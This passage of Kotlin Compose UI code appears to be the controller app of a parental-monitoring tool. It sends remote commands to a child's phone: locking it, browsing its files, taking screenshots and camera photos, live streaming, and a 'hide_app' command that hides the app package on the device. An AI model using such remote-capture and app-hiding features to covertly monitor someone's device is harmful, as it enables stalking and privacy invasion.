                                                                    text = "بث فوري",
                                                                    color = Color(0xFF0369A1),
                                                                    fontSize = 8.sp,
                                                                    fontWeight = FontWeight.Bold
                                                                )
                                                            }
                                                        }
                                                    }
                                                }
                                                Spacer(modifier = Modifier.height(2.dp))
                                                ConnectionStatusItem(dev)
                                            }
                                        }
                                        
                                        Box(
                                            modifier = Modifier.size(32.dp).clip(CircleShape).background(Color(0xFFF9FAFB)),
                                            contentAlignment = Alignment.Center
                                        ) {
                                            Icon(Icons.Default.KeyboardArrowLeft, null, tint = Color(0xFF9CA3AF), modifier = Modifier.size(18.dp))
                                        }
                                    }
                                    
                                    Spacer(modifier = Modifier.height(8.dp))
                                    
                                    // Bento Details Grid Row 
                                    Row(
                                        modifier = Modifier.fillMaxWidth(),
                                        horizontalArrangement = Arrangement.spacedBy(6.dp)
                                    ) {
                                        // Bento Compartment 1: Battery block
                                        Box(
                                            modifier = Modifier
                                                .weight(1f)
                                                .background(Color(0xFFF9FAFB), RoundedCornerShape(10.dp))
                                                .border(1.dp, Color(0xFFF0FDF4), RoundedCornerShape(10.dp))
                                                .padding(8.dp)
                                        ) {
                                            Column {
                                                Text("البطارية", color = Color.Gray, fontSize = 9.sp, fontWeight = FontWeight.Bold)
                                                Spacer(modifier = Modifier.height(2.dp))
                                                Row(verticalAlignment = Alignment.CenterVertically) {
                                                    Icon(getBatteryIcon(dev.battery), null, tint = getBatteryColor(dev.battery), modifier = Modifier.size(12.dp))
                                                    Spacer(modifier = Modifier.width(4.dp))
                                                    Text("${dev.battery}%", color = Color(0xFF111827), fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                                }
                                            }
                                        }
                                        // Bento Compartment 2: Network block
                                        Box(
                                            modifier = Modifier
                                                .weight(1f)
                                                .background(Color(0xFFF9FAFB), RoundedCornerShape(10.dp))
                                                .border(1.dp, Color(0xFFEFF6FF), RoundedCornerShape(10.dp))
                                                .padding(8.dp)
                                        ) {
                                            Column {
                                                Text("الشبكة والاتصال", color = Color.Gray, fontSize = 9.sp, fontWeight = FontWeight.Bold)
                                                Spacer(modifier = Modifier.height(2.dp))
                                                Row(verticalAlignment = Alignment.CenterVertically) {
                                                    val isWifi = dev.networkType?.contains("WIFI", ignoreCase = true) == true
                                                    Icon(if (isWifi) Icons.Default.Wifi else Icons.Default.CellTower, null, tint = Color(0xFF9155FF), modifier = Modifier.size(13.dp))
                                                    Spacer(modifier = Modifier.width(4.dp))
                                                    Text(dev.networkType ?: "غير معروف", color = Color(0xFF111827), fontSize = 11.sp, fontWeight = FontWeight.SemiBold, maxLines = 1, overflow = TextOverflow.Ellipsis)
                                                }
                                            }
                                        }
                                    }
                                }
                            }
                            }
                        }
                    }
                }
            }

            if (showAddDeviceDialog) {
                DeviceSelectionDialog(
                    devicesList = devices,
                    currentToken = null,
                    onClose = { showAddDeviceDialog = false },
                    onSelect = { tok ->
                        viewModel.selectDevice(tok)
                        showAddDeviceDialog = false
                    },
                    onAddDevice = { tok, name ->
                        viewModel.registerDeviceManually(tok, name)
                        showAddDeviceDialog = false
                    }
                )
            }

            if (showEditDbDialog) {
                EditDatabaseUrlDialog(
                    currentUrl = currentDbUrl,
                    onClose = { showEditDbDialog = false },
                    onSave = { newUrl ->
                        viewModel.updateDatabaseUrl(newUrl)
                        showEditDbDialog = false
                    }
                )
            }
        }
    } else {
        // --- 2. DEVICE DETAIL SCREEN WITH BOTTOM NAVIGATION ---
        Box(
            modifier = Modifier.fillMaxSize().background(Brush.verticalGradient(listOf(Color(0xFFF3F4F6), Color(0xFFE5E7EB))))
        ) {
            Column(modifier = Modifier.fillMaxSize()) {
                Surface(
                    modifier = Modifier.fillMaxWidth(),
                    color = Color.White.copy(alpha = 0.95f),
                    shadowElevation = 8.dp,
                    shape = RoundedCornerShape(bottomStart = 24.dp, bottomEnd = 24.dp)
                ) {
                    val rootPath = "/storage/emulated/0"
                    val currentPath by viewModel.currentPath.collectAsState()
                    
                    Row(
                        modifier = Modifier
                            .fillMaxWidth()
                            .padding(horizontal = 4.dp, vertical = 12.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        IconButton(onClick = { 
                            if (openCommandDetails != null) {
                                openCommandDetails = null
                            } else if (bottomNavSelectedTab == 2 && currentPath.length > rootPath.length && currentPath.startsWith(rootPath)) {
                                val parentPath = currentPath.substringBeforeLast("/")
                                val newPath = if (parentPath.isEmpty() || parentPath.length < rootPath.length) rootPath else parentPath
                                viewModel.exploreDirectory(newPath)
                            } else {
                                viewModel.selectDevice("")
                            }
                        }) {
                            Icon(Icons.AutoMirrored.Filled.ArrowBack, contentDescription = "رجوع", tint = Color(0xFF1F2937))
                        }
                        
                        Column(
                            modifier = Modifier.weight(1f),
                            horizontalAlignment = Alignment.CenterHorizontally
                        ) {
                            if (bottomNavSelectedTab == 2) {
                                // Unified Files Explorer Header
                                Text("${activeDevice.name} - الملفات", color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                                Spacer(modifier = Modifier.height(2.dp))
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Icon(Icons.Default.FolderOpen, null, tint = Color(0xFF0369A1), modifier = Modifier.size(12.dp))
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text(
                                        text = currentPath,
                                        color = Color(0xFF0369A1),
                                        fontSize = 11.sp,
                                        maxLines = 1,
                                        overflow = TextOverflow.Ellipsis
                                    )
                                }
                            } else {
                                // Default Header
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    Text(activeDevice.name, color = Color(0xFF1F2937), fontSize = 14.sp, fontWeight = FontWeight.Bold)
                                    if (activeDevice.isRealtimeUpdated) {
                                        Spacer(modifier = Modifier.width(6.dp))
                                        Box(
                                            modifier = Modifier
                                                .size(6.dp)
                                                .clip(CircleShape)
                                                .background(Color(0xFF0369A1))
                                        )
                                    }
                                }
                                Row(verticalAlignment = Alignment.CenterVertically) {
                                    val isRealtime = activeDevice.isRealtimeUpdated
                                    Box(
                                        modifier = Modifier
                                            .size(5.dp)
                                            .clip(CircleShape)
                                            .background(if (isRealtime) Color(0xFF0284C7) else if (activeDevice.isOnline) Color(0xFF39D353) else Color(0xFF6B7280))
                                    )
                                    Spacer(modifier = Modifier.width(4.dp))
                                    Text(
                                        text = if (isRealtime) "بث حي فوري WebSocket نشط" else if (activeDevice.isOnline) "متصل الآن" else "غير متصل", 
                                        color = if (isRealtime) Color(0xFF0369A1) else if (activeDevice.isOnline) Color(0xFF39D353) else Color(0xFF6B7280), 
                                        fontSize = 10.sp,
                                        fontWeight = if (isRealtime) FontWeight.Bold else FontWeight.Normal
                                    )
                                }
                            }
                        }
                        
                        if (bottomNavSelectedTab == 2) {
                            IconButton(onClick = { viewModel.requestDirectoryScan(currentPath) }) {
                                Icon(Icons.Default.Refresh, contentDescription = "تحديث الملفات", tint = Color(0xFF9155FF))
                            }
                        } else {
                            Spacer(modifier = Modifier.width(48.dp)) // To center title
                        }
                    }
                }

                commandResponse?.let { resp ->
                    // Only show status messages if they are NOT "success" to remove top success notifications
                    if (resp.first != "success") {
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFFFEF2F2)),
                            shape = RoundedCornerShape(0.dp),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Row(modifier = Modifier.padding(12.dp, 6.dp), verticalAlignment = Alignment.CenterVertically) {
                                Icon(Icons.Default.Warning, null, tint = Color(0xFF1F2937), modifier = Modifier.size(14.dp))
                                Spacer(modifier = Modifier.width(8.dp))
                                Text("تنبيه: ${resp.second}", color = Color(0xFF1F2937), fontSize = 11.sp)
                            }
                        }
                    }
                }

                val isRefreshing by viewModel.isRefreshing.collectAsState()

                Box(
                    modifier = Modifier.weight(1f).fillMaxWidth()
                ) {
                    when (bottomNavSelectedTab) {
                        0 -> DeviceHomeTab(activeDevice, viewModel)
                        1 -> DeviceCommandsTab(activeDevice, viewModel, openCommandDetails, onOpenCommand = { openCommandDetails = it })
                        2 -> DeviceFilesExplorerTab(viewModel)
                        3 -> LiveStreamRequirementsPage(viewModel)
                    }
                }
            }
            
            // FLOATING BOTTOM NAVIGATION
            Box(
                modifier = Modifier
                    .align(Alignment.BottomCenter)
                    .fillMaxWidth()
                    .padding(horizontal = 32.dp, vertical = 24.dp)
            ) {
                Surface(
                    color = Color.White.copy(alpha = 0.95f),
                    shape = RoundedCornerShape(32.dp),
                    shadowElevation = 16.dp,
                    modifier = Modifier.fillMaxWidth().shadow(
                        elevation = 16.dp,
                        shape = RoundedCornerShape(32.dp),
                        spotColor = Color(0xFF9155FF).copy(alpha = 0.25f),
                        ambientColor = Color(0xFF9155FF).copy(alpha = 0.25f)
                    )
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth().height(64.dp),
                        horizontalArrangement = Arrangement.SpaceEvenly,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        listOf(
                            Triple(0, Icons.Default.Home, "الرئيسية"),
                            Triple(1, Icons.Default.GridView, "الأوامر"),
                            Triple(2, Icons.Default.Folder, "الملفات"),
                            Triple(3, Icons.Default.Tv, "البث")
                        ).forEach { (index, icon, label) ->
                            val isSelected = bottomNavSelectedTab == index
                            val contentColor = if (isSelected) Color(0xFF9155FF) else Color(0xFF9CA3AF)
                            val backgroundColor = if (isSelected) Color(0xFF9155FF).copy(alpha = 0.1f) else Color.Transparent

                            Box(
                                modifier = Modifier
                                    .weight(1f)
                                    .padding(horizontal = 8.dp, vertical = 8.dp)
                                    .clip(RoundedCornerShape(24.dp))
                                    .background(backgroundColor)
                                    .clickable {
                                        bottomNavSelectedTab = index
                                        if (index == 0) openCommandDetails = null
                                    },
                                contentAlignment = Alignment.Center
                            ) {
                                Row(
                                    verticalAlignment = Alignment.CenterVertically,
                                    horizontalArrangement = Arrangement.Center,
                                    modifier = Modifier.padding(vertical = 8.dp)
                                ) {
                                    Icon(
                                        imageVector = icon,
                                        contentDescription = null,
                                        tint = contentColor,
                                        modifier = Modifier.size(22.dp)
                                    )
                                    if (isSelected) {
                                        Spacer(modifier = Modifier.width(8.dp))
                                        Text(
                                            text = label,
                                            fontSize = 13.sp,
                                            fontWeight = FontWeight.Bold,
                                            color = contentColor
                                        )
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }

    // Modal Progress Dialog for Two-Stage Command Execution (إرسال وتنفيذ الأوامر بمرحلتين)
    activeCommandProgress?.let { progress ->
        Dialog(onDismissRequest = { viewModel.clearActiveCommandProgress() }) {
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(16.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                border = BorderStroke(1.dp, Color(0xFFE5E7EB))
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(20.dp),
                    horizontalAlignment = Alignment.CenterHorizontally
                ) {
                    Icon(
                        imageVector = Icons.Default.SettingsSuggest,
                        contentDescription = null,
                        tint = Color(0xFF9155FF),
                        modifier = Modifier.size(44.dp)
                    )
                    Spacer(modifier = Modifier.height(12.dp))
                    Text(
                        text = "جاري تنفيذ الأمر",
                        color = Color(0xFF1F2937),
                        fontSize = 18.sp,
                        fontWeight = FontWeight.Bold,
                        textAlign = TextAlign.Center
                    )
                    Text(
                        text = progress.commandLabel,
                        color = Color(0xFF9155FF),
                        fontSize = 14.sp,
                        fontWeight = FontWeight.SemiBold,
                        textAlign = TextAlign.Center
                    )
                    Spacer(modifier = Modifier.height(20.dp))

                    // Stage 1: Sending Command (المرحلة الأولى: إرسال الأمر)
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(32.dp)
                                .clip(CircleShape)
                                .background(
                                    when (progress.sendStatus) {
                                        CommandStepStatus.RUNNING -> Color(0xFF9155FF).copy(alpha = 0.2f)
                                        CommandStepStatus.SUCCESS -> Color(0xFF238636).copy(alpha = 0.2f)
                                        CommandStepStatus.FAILED -> Color(0xFFEF4444).copy(alpha = 0.2f)
                                        else -> Color(0xFFE5E7EB)
                                    }
                                ),
                            contentAlignment = Alignment.Center
                        ) {
                            when (progress.sendStatus) {
                                CommandStepStatus.RUNNING -> {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(16.dp),
                                        color = Color(0xFF9155FF),
                                        strokeWidth = 2.dp
                                    )
                                }
                                CommandStepStatus.SUCCESS -> {
                                    Icon(Icons.Default.Check, null, tint = Color(0xFF39D353), modifier = Modifier.size(18.dp))
                                }
                                CommandStepStatus.FAILED -> {
                                    Icon(Icons.Default.Close, null, tint = Color(0xFFEF4444), modifier = Modifier.size(18.dp))
                                }
                                else -> {
                                    Text("١", color = Color(0xFF6B7280), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "المرحلة الأولى: إرسال الأمر للجهاز",
                                color = Color(0xFF1F2937),
                                fontSize = 13.sp,
                                fontWeight = FontWeight.Bold
                            )
                            Text(
                                text = when (progress.sendStatus) {
                                    CommandStepStatus.IDLE -> "في الانتظار..."
                                    CommandStepStatus.RUNNING -> "جاري برمجة وإرسال الأمر إلى شبكة التحكم..."
                                    CommandStepStatus.SUCCESS -> "تم إرسال الأمر وتأكيده بنجاح في قاعدة البيانات!"
                                    CommandStepStatus.FAILED -> "فشل إرسال الأمر بنجاح"
                                },
                                color = Color(0xFF6B7280),
                                fontSize = 11.sp
                            )
                        }
                    }

                    progress.sendError?.let { err ->
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFFEF4444).copy(alpha = 0.1f)),
                            border = BorderStroke(1.dp, Color(0xFFEF4444).copy(alpha = 0.3f)),
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(start = 44.dp, bottom = 10.dp)
                        ) {
                            Text(
                                text = "خطأ بالتفصيل: $err",
                                color = Color(0xFFEF4444),
                                fontSize = 11.sp,
                                modifier = Modifier.padding(10.dp)
                            )
                        }
                    }

                    Box(
                        modifier = Modifier
                            .padding(start = 16.dp)
                            .width(2.dp)
                            .height(20.dp)
                            .background(Color(0xFFE5E7EB))
                            .align(Alignment.Start)
                    )

                    // Stage 2: Accepting & Executing command (المرحلة الثانية: قبول وتنفيذ هاتف الطفل للأمر)
                    Row(
                        modifier = Modifier.fillMaxWidth().padding(vertical = 8.dp),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Box(
                            modifier = Modifier
                                .size(32.dp)
                                .clip(CircleShape)
                                .background(
                                    when (progress.executionStatus) {
                                        CommandStepStatus.RUNNING -> Color(0xFF9155FF).copy(alpha = 0.2f)
                                        CommandStepStatus.SUCCESS -> Color(0xFF238636).copy(alpha = 0.2f)
                                        CommandStepStatus.FAILED -> Color(0xFFEF4444).copy(alpha = 0.2f)
                                        else -> Color(0xFFE5E7EB)
                                    }
                                ),
                            contentAlignment = Alignment.Center
                        ) {
                            when (progress.executionStatus) {
                                CommandStepStatus.RUNNING -> {
                                    CircularProgressIndicator(
                                        modifier = Modifier.size(16.dp),
                                        color = Color(0xFF9155FF),
                                        strokeWidth = 2.dp
                                    )
                                }
                                CommandStepStatus.SUCCESS -> {
                                    Icon(Icons.Default.Check, null, tint = Color(0xFF39D353), modifier = Modifier.size(18.dp))
                                }
                                CommandStepStatus.FAILED -> {
                                    Icon(Icons.Default.Close, null, tint = Color(0xFFEF4444), modifier = Modifier.size(18.dp))
                                }
                                else -> {
                                    Text("٢", color = Color(0xFF6B7280), fontSize = 12.sp, fontWeight = FontWeight.Bold)
                                }
                            }
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Column(modifier = Modifier.weight(1f)) {
                            Text(
                                text = "المرحلة الثانية: قبول وتنفيذ هاتف الطفل للأمر",
                                color = Color(0xFF1F2937),
                                fontSize = 13.sp,
                                fontWeight = FontWeight.Bold
                            )
                            Text(
                                text = when (progress.executionStatus) {
                                    CommandStepStatus.IDLE -> "بانتظار اكتمال المرحلة الأولى..."
                                    CommandStepStatus.RUNNING -> "بانتظار هاتف الطفل لتلقي وتأكيد معالجة الطلب..."
                                    CommandStepStatus.SUCCESS -> "تمت معالجة وتنفيذ الأمر بنجاح من طرف هاتف الطفل!"
                                    CommandStepStatus.FAILED -> "فشل هاتف الطفل في معالجة أو تنفيذ الأمر"
                                },
                                color = Color(0xFF6B7280),
                                fontSize = 11.sp
                            )
                        }
                    }

                    progress.executionError?.let { err ->
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFFEF4444).copy(alpha = 0.1f)),
                            border = BorderStroke(1.dp, Color(0xFFEF4444).copy(alpha = 0.3f)),
                            modifier = Modifier
                                .fillMaxWidth()
                                .padding(start = 44.dp, bottom = 10.dp)
                        ) {
                            Text(
                                text = "تفاصيل الخطأ: $err",
                                color = Color(0xFFEF4444),
                                fontSize = 11.sp,
                                modifier = Modifier.padding(10.dp)
                            )
                        }
                    }

                    Spacer(modifier = Modifier.height(20.dp))

                    progress.resultMessage?.let { msg ->
                        Card(
                            colors = CardDefaults.cardColors(containerColor = Color(0xFFF3F4F6)),
                            border = BorderStroke(1.dp, Color(0xFFE5E7EB)),
                            modifier = Modifier.fillMaxWidth()
                        ) {
                            Column(modifier = Modifier.padding(12.dp)) {
                                Text(
                                    text = "الرد المستلم:",
                                    color = Color(0xFF9155FF),
                                    fontSize = 12.sp,
                                    fontWeight = FontWeight.Bold
                                )
                                Spacer(modifier = Modifier.height(4.dp))
                                Text(
                                    text = msg,
                                    color = Color(0xFF1F2937),
                                    fontSize = 12.sp
                                )
                            }
                        }
                        Spacer(modifier = Modifier.height(16.dp))
                    }

                    Button(
                        onClick = { viewModel.clearActiveCommandProgress() },
                        colors = ButtonDefaults.buttonColors(
                            containerColor = if (progress.executionStatus == CommandStepStatus.RUNNING || progress.sendStatus == CommandStepStatus.RUNNING) Color(0xFFE5E7EB) else Color(0xFF9155FF)
                        ),
                        modifier = Modifier.fillMaxWidth(),
                        shape = RoundedCornerShape(8.dp)
                    ) {
                        Text(
                            text = if (progress.executionStatus == CommandStepStatus.RUNNING || progress.sendStatus == CommandStepStatus.RUNNING) "إلغاء المتابعة" else "إغلاق",
                            fontSize = 13.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                }
            }
        }
    }

    // Direct Screenshot Viewer Overlay (عرض لقطة الشاشة المستلمة مباشرة على الشاشة)
    directScreenshotToShow?.let { item ->
        val bitmap by produceState<Bitmap?>(initialValue = null, item.base64) {
            value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { item.toBitmap() }
        }

        Dialog(onDismissRequest = { viewModel.clearDirectScreenshot() }) {
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(8.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                border = BorderStroke(1.dp, Color(0xFFE5E7EB))
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(14.dp)
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "تم استلام لقطة الشاشة المطلوبة مباشرة!",
                            color = Color(0xFF1F2937),
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                        IconButton(onClick = { viewModel.clearDirectScreenshot() }) {
                            Icon(Icons.Default.Close, null, tint = Color(0xFF1F2937))
                        }
                    }

                    Text(
                        text = "تم التقاطها: " + SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(item.timestamp)),
                        color = Color(0xFF6B7280),
                        fontSize = 11.sp
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    val bmp = bitmap
                    if (bmp != null) {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(380.dp)
                                .clip(RoundedCornerShape(8.dp))
                                .background(Color.Black),
                            contentAlignment = Alignment.Center
                        ) {
                            Image(
                                bitmap = bmp.asImageBitmap(),
                                contentDescription = "بث مباشر شاشة",
                                modifier = Modifier.fillMaxSize(),
                                contentScale = ContentScale.Fit
                            )
                        }

                        Spacer(modifier = Modifier.height(12.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = {
                                    val ok = saveBitmapToGallery(context, bmp, "child_screenshot_${item.timestamp}")
                                    if (ok) {
                                        Toast.makeText(context, "تم حفظ لقطة الشاشة في الاستوديو!", Toast.LENGTH_SHORT).show()
                                    } else {
                                        Toast.makeText(context, "فشل حفظ الملف لعدم توفر الصلاحيات", Toast.LENGTH_SHORT).show()
                                    }
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)),
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(8.dp)
                            ) {
                                Icon(Icons.Default.Download, null, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("حفظ بالاستوديو", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                            }

                            Button(
                                onClick = { viewModel.clearDirectScreenshot() },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE5E7EB)),
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(8.dp)
                            ) {
                                Text("إغلاق", fontSize = 12.sp)
                            }
                        }
                    } else {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(200.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            CircularProgressIndicator(color = Color(0xFF9155FF))
                        }
                    }
                }
            }
        }
    }

    // Direct Camera Photo Viewer Overlay (عرض صورة الكاميرا المستلمة مباشرة على الشاشة)
    directPhotoToShow?.let { item ->
        val bitmap by produceState<Bitmap?>(initialValue = null, item.base64) {
            value = kotlinx.coroutines.withContext(kotlinx.coroutines.Dispatchers.IO) { item.toBitmap() }
        }

        Dialog(onDismissRequest = { viewModel.clearDirectPhoto() }) {
            Card(
                modifier = Modifier
                    .fillMaxWidth()
                    .padding(8.dp),
                shape = RoundedCornerShape(16.dp),
                colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
                border = BorderStroke(1.dp, Color(0xFFE5E7EB))
            ) {
                Column(
                    modifier = Modifier
                        .fillMaxWidth()
                        .padding(14.dp)
                ) {
                    Row(
                        modifier = Modifier.fillMaxWidth(),
                        horizontalArrangement = Arrangement.SpaceBetween,
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        Text(
                            text = "تم التقاط واستلام صورة الكاميرا بنجاح!",
                            color = Color(0xFF1F2937),
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                        IconButton(onClick = { viewModel.clearDirectPhoto() }) {
                            Icon(Icons.Default.Close, null, tint = Color(0xFF1F2937))
                        }
                    }

                    Text(
                        text = "الكاميرا المستعملة: " + (if (item.cameraType == "front" || item.type == "camera_front") "الأمامية" else "الخلفية") + " | " + SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(item.timestamp)),
                        color = Color(0xFF6B7280),
                        fontSize = 11.sp
                    )

                    Spacer(modifier = Modifier.height(10.dp))

                    val bmp = bitmap
                    if (bmp != null) {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(380.dp)
                                .clip(RoundedCornerShape(8.dp))
                                .background(Color.Black),
                            contentAlignment = Alignment.Center
                        ) {
                            Image(
                                bitmap = bmp.asImageBitmap(),
                                contentDescription = "صورة الكاميرا المستلمة",
                                modifier = Modifier.fillMaxSize(),
                                contentScale = ContentScale.Fit
                            )
                        }

                        Spacer(modifier = Modifier.height(12.dp))

                        Row(
                            modifier = Modifier.fillMaxWidth(),
                            horizontalArrangement = Arrangement.spacedBy(8.dp)
                        ) {
                            Button(
                                onClick = {
                                    val ok = saveBitmapToGallery(context, bmp, "child_camera_${item.timestamp}")
                                    if (ok) {
                                        Toast.makeText(context, "تم حفظ الصورة بنجاح بالأستوديو!", Toast.LENGTH_SHORT).show()
                                    } else {
                                        Toast.makeText(context, "فشل حفظ الصورة لعدم توفر الصلاحيات", Toast.LENGTH_SHORT).show()
                                    }
                                },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF9155FF)),
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(8.dp)
                            ) {
                                Icon(Icons.Default.Download, null, modifier = Modifier.size(16.dp))
                                Spacer(modifier = Modifier.width(6.dp))
                                Text("حفظ بالاستوديو", fontSize = 12.sp, fontWeight = FontWeight.Bold)
                            }

                            Button(
                                onClick = { viewModel.clearDirectPhoto() },
                                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE5E7EB)),
                                modifier = Modifier.weight(1f),
                                shape = RoundedCornerShape(8.dp)
                            ) {
                                Text("إغلاق", fontSize = 12.sp)
                            }
                        }
                    } else {
                        Box(
                            modifier = Modifier
                                .fillMaxWidth()
                                .height(200.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            CircularProgressIndicator(color = Color(0xFF9155FF))
                        }
                    }
                }
            }
        }
    }
}

@Composable
fun DeviceHomeTab(device: Device, viewModel: AdminViewModel) {
    Column(
        modifier = Modifier
            .fillMaxSize()
            .verticalScroll(rememberScrollState())
            .padding(start = 16.dp, end = 16.dp, top = 16.dp, bottom = 100.dp),
        verticalArrangement = Arrangement.spacedBy(14.dp)
    ) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFFFFFFFF)),
            shape = RoundedCornerShape(20.dp),
            elevation = CardDefaults.cardElevation(defaultElevation = 0.dp),
            border = BorderStroke(0.5.dp, Color(0xFFF3F4F6)),
            modifier = Modifier.fillMaxWidth().shadow(
                elevation = 8.dp, 
                shape = RoundedCornerShape(20.dp), 
                spotColor = Color(0xFF9155FF).copy(alpha = 0.08f), 
                ambientColor = Color(0xFF9155FF).copy(alpha = 0.08f)
            )
        ) {
            Column(modifier = Modifier.padding(14.dp)) {
                Row(verticalAlignment = Alignment.CenterVertically) {
                    Icon(
                        imageVector = if (device.isLocked) Icons.Default.Lock else Icons.Default.LockOpen,
                        contentDescription = null,
                        tint = if (device.isLocked) Color(0xFFFF4081) else Color(0xFF238636),
                        modifier = Modifier.size(24.dp)
                    )
                    Spacer(modifier = Modifier.width(12.dp))
                    Column {
                        Text(if (device.isLocked) "الجهاز مقفل حالياً" else "الجهاز حر ومفتوح", color = Color(0xFF111827), fontSize = 16.sp, fontWeight = FontWeight.Bold)
                        Text("قفل أو فك قفل شاشة الطفل لمنع استخدامه", color = Color(0xFF6B7280), fontSize = 11.sp, fontWeight = FontWeight.Medium)
                    }
                }
                Spacer(modifier = Modifier.height(16.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(
                        onClick = { viewModel.changeLockStatus(true) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
                        contentPadding = PaddingValues(),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.weight(1f).height(44.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .background(Brush.linearGradient(listOf(Color(0xFFFF4B8B), Color(0xFFFF7A55))))
                                .padding(horizontal = 16.dp, vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Text("قفل الهاتف", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color.White)
                        }
                    }
                    Button(
                        onClick = { viewModel.changeLockStatus(false) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
                        contentPadding = PaddingValues(),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.weight(1f).height(44.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .background(Brush.linearGradient(listOf(Color(0xFF10B981), Color(0xFF059669))))
                                .padding(horizontal = 16.dp, vertical = 8.dp),
                            contentAlignment = Alignment.Center
                        ) {
                            Text("فك القفل", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color.White)
                        }
                    }
                }
                Spacer(modifier = Modifier.height(12.dp))
                Button(
                    onClick = { viewModel.runCommand("ACTION_LOCK_SCREEN") },
                    colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
                    contentPadding = PaddingValues(),
                    shape = RoundedCornerShape(12.dp),
                    modifier = Modifier.fillMaxWidth().height(44.dp)
                ) {
                    Box(
                        modifier = Modifier
                            .fillMaxSize()
                            .background(Brush.linearGradient(listOf(Color(0xFF9155FF), Color(0xFF7C3AED))))
                            .padding(horizontal = 16.dp, vertical = 8.dp),
                        contentAlignment = Alignment.Center
                    ) {
                        Row(verticalAlignment = Alignment.CenterVertically) {
                            Icon(Icons.Default.PowerSettingsNew, null, modifier = Modifier.size(18.dp), tint = Color.White)
                            Spacer(modifier = Modifier.width(8.dp))
                            Text("إطفاء شاشة الهاتف", fontSize = 13.sp, fontWeight = FontWeight.Bold, color = Color.White)
                        }
                    }
                }

                Spacer(modifier = Modifier.height(12.dp))
                Row(modifier = Modifier.fillMaxWidth(), horizontalArrangement = Arrangement.spacedBy(12.dp)) {
                    Button(
                        onClick = { viewModel.runCommand("hide_app", mapOf("packageName" to "com.aistudio.commander.bxyz", "hidden" to true)) },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Transparent),
                        contentPadding = PaddingValues(),
                        shape = RoundedCornerShape(12.dp),
                        modifier = Modifier.weight(1f).height(44.dp)
                    ) {
                        Box(
                            modifier = Modifier
                                .fillMaxSize()
                                .background(Brush.linearGradient(listOf(Color(0xFFFF4B8B), Color(0xFFFF7A55))))
